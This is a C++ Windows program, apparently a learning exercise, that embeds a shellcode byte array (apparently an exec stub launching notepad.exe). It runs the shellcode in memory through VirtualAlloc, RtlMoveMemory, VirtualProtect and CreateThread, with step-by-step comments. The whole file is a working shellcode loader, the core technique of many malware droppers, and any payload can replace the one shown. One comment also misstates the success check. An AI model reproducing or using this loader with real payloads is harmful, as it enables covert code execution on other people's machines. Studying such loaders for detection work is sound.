#include <windows.h>
#include <stdio.h>
#include <bits/stdc++.h>

using namespace std;
//decalring the shellcode before the execution of the main function gets it into the data section as the text section just starts from the execution of the main function
    unsigned char shellcode[] = {
    0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64, 0x8B, 0x50, 0x30, 0x8B,
    0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28, 0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C,
    0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
    0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78, 0xE3, 0x48, 0x01, 0xD1, 0x51, 0x8B, 0x59, 0x20,
    0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC,
    0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,
    0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3,
    0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF,
    0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x6A, 0x01, 0x8D, 0x85, 0xB2, 0x00, 0x00,
    0x00, 0x50, 0x68, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x68, 0xA6,
    0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x53, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E,
    0x65, 0x78, 0x65, 0x00
};
//The above is the shellcode in the array format so that we will be able to use it inside our program code.

unsigned int shellcode_size=sizeof(shellcode);

int main(){

// cout<<shellcode_size;
// Now we will have to allocate a virtual memory to the program to be able to write our shellcode there.
LPVOID memory_address = VirtualAlloc(NULL,shellcode_size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE
//   [in, optional] LPVOID lpAddress,
//   [in]           SIZE_T dwSize,
//   [in]           DWORD  flAllocationType,
//   [in]           DWORD  flProtect
);
//now memory_address is the variable that will hold the allocated memory for our shellcode.

//loading the shellcode into the virtual allocated memory
RtlMoveMemory(memory_address,shellcode,shellcode_size
//   _Out_       VOID UNALIGNED *Destination,
//   _In_  const VOID UNALIGNED *Source,
//   _In_        SIZE_T         Length
);

//making the shellcode executable
DWORD old_protection = 0;
//the old_protrection provided to the memory area should be a DWORD pointer else it will not be changed.
BOOL flag = VirtualProtect(memory_address,shellcode_size,PAGE_EXECUTE_READ,&old_protection
//   [in]  PVOID  Address,
//   [in]  SIZE_T Size,
//   [in]  ULONG  NewProtection,
//   [out] PULONG OldProtection
);

//if the flag is 0 then the shellcode will be executed by creating a thread
if (flag!=0)
{
    HANDLE thr_handle = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE) memory_address,NULL,(DWORD)NULL,NULL
//   [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
//   [in]            SIZE_T                  dwStackSize,
//   [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
//   [in, optional]  __drv_aliasesMem LPVOID lpParameter,
//   [in]            DWORD                   dwCreationFlags,
//   [out, optional] LPDWORD                 lpThreadId
);

//Now we want the thread to be finish its execution first and then move onto the rest of the program code.
DWORD wait = WaitForSingleObject(thr_handle,INFINITE
//   [in] HANDLE hHandle,
//   [in] DWORD  dwMilliseconds
);
//giving a finite amount of seconds will result in waiting for a number of seconds for the execution of the thread handle


}

return 0;
}